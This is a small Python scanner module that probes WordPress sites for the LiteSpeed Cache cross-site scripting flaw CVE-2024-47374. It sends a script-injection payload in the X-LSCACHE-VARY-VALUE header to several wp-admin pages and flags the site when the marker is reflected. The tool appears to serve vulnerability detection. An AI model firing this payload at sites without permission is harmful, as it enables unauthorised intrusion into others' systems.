#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
https://blog.ostorlab.co/litespeed-cache,cve-2024-47374.html
"""

from modules.utils import requests, sys, configure_logger, Identify

logger = configure_logger(__name__)


PAGES = [
    'wp-admin/admin.php?page=lscache-ccss',
    'wp-admin/admin.php?page=lscache',
    'wp-admin/admin.php?page=lscache-purge',
    'wp-admin/admin.php?page=lscache-settings',
    'wp-admin/admin.php?page=lscache-advanced'
]

def litespeed(base_url):
    headers = {
        'X-LSCACHE-VARY-VALUE': '"><script>alert("CVE-2024-47374")</script>'
    }

    for page in PAGES:
        target_url = f"{base_url}{page}"
        try:
            response = requests.get(target_url, headers=headers, verify=False, timeout=10)
            if 'CVE-2024-47374' in response.text:
                print(f" {Identify.confirmed} | CVE-2024-47374| \033[34m{target_url}\033[0m | PAYLOAD: {headers}")
        except requests.Timeout:
            #print(f"request timeout {url} {p}")
            pass
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except Exception as e:
            #print(f"Error : {e}")
            logger.exception(e)
            pass

